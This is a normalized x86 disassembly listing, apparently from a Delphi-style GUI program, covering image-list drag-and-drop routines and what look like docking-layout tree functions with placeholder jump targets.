call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_43ba88
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44091c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_440a58
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_43bae8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_44091c
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_43b9bc
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_43bb48
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_43ba88
push 0x0
call ShowCursor
sub_43bb48
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_44091c
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_43bbac
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_43b97c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_43bbac
push ebx
mov ebx eax
mov eax ebx
call sub_44091c
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_43bbd0
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44091c
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_43b97c
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43bc44
push ebx
push esi
mov esi eax
mov eax esi
call sub_44091c
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_43bbac
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_43bad0
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_43bc8c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_435e9c
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d474
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_43254c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_43bce8
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_4030f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_435fc0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_43bd38
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41d778
xor eax eax
push ebp
push sub_43bdd6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_41db5c
xor eax eax
push ebp
push sub_43bdb3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_432564
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bdba
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_41db5c
retn
sub_43bde8
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_43be7c
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_43be04
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43be7c
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_43c474
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_43be7c
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_43beb0
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_43bf40
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
mov edx 0x2
call sub_43bf40
jmp r-xdata
retn
sub_43bef8
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_43bfac
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
mov edx 0x2
call sub_43bfac
jmp r-xdata
retn
sub_43bf40
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_43c374
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_43bfac
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_43be60
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_43c374
push eax
mov eax esi
call sub_43beb0
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_43c374
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_43c05c
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_43be60
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_43c474
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_43bfac
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_43be60
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_43bfac
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_43beb0
mov edx eax
add edx esi
mov eax ebx
call sub_43c39c
mov edx edi
mov eax ebx
call sub_43c39c
jmp r-xdata
mov eax ebx
call sub_43c1fc
mov eax ebx
call sub_43c44c
mov ebx eax
test ebx ebx
jne r-xdata
sub_43c104
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_403eac
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_403f00
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b27c
call sub_403864
sub_43c148
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_4032ec
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_43c1b9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_434688
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_43c1cc
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_43c44c
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_43c1fc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_43bfac
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_43bfac
mov esi eax
push ebp
call sub_43c1cc
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43c44c
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_43bf40
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_43bf40
mov ecx ebx
pop edx
call sub_412454
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_433330
mov eax [ ebp - 0x4 ]
call sub_43c374
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_43c374
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_43c374
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_43c374
push ebx
mov ebx eax
mov eax ebx
call sub_43be7c
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_43be04
test al al
je r-xdata
mov eax ebx
call sub_43beb0
pop ebx
retn
sub_43c3b0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43c39c
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_43be4c
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_43c3a0
mov edx esi
call sub_43c3b0
sub_43c3ec
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_43c374
mov edi eax
mov eax ebx
call sub_43beb0
cmp edi eax
jl r-xdata
mov eax esi
call sub_43c05c
mov eax [ esi + 0x1c ]
push eax
push sub_43defc
mov edx esi
call sub_43c728
mov eax ebx
call sub_43c374
mov edi eax
mov eax esi
call sub_43bef8
cmp edi eax
jle r-xdata
mov eax ebx
call sub_43c3ec
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_43c458
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_43be7c
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_43c480
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4030c0
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_4033fc
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43be28
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d17c
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_4222c0
mov edx eax
mov eax ebx
call sub_41d2f8
mov eax [ ebp - 0x4 ]
call sub_43c650
xor eax eax
push ebp
push sub_43c58c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_436ea0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_43c05c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c593
mov eax [ ebp - 0x4 ]
call sub_43c654
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_436e64
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_43c593
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_43e424
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_43c5e8
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_43d654
mov eax [ esi + 0x10 ]
call sub_4030f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e0
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_43c668
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_43c668
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_43c668
pop ecx
sub_43c6c0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_43c668
pop ecx
sub_43c6ec
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_43c6ec
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_43c6ec
pop ecx
sub_43c740
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_43c6c0
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_43bfac
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_43bfac
push eax
mov edx 0x1
mov eax ebx
call sub_43bf40
push eax
mov edx 0x2
mov eax ebx
call sub_43bf40
pop edx
pop ecx
call sub_412454
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402b04
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_43c7c4
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_43c1fc
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_412454
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_433330
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43be28
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_43c6c0
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_43be4c
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_43d6ec
mov edx esi
mov eax ebx
call sub_43c6c0
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_433914
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43be28
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_433900
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_43bfac
mov edx eax
mov eax edi
call sub_43c39c
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_43bfac
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_43bfac
mov edx eax
mov eax edi
call sub_43c39c
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_43bfac
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_43c9d4
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_43cb7c
jmp r-xdata
sub_43c9d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43be28
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_43c374
mov edx eax
mov eax ebx
call sub_43c39c
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_43c39c
mov eax [ esi + 0x64 ]
call sub_43c374
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_43da44
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_43c728
mov eax [ esi + 0x64 ]
call sub_43c374
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
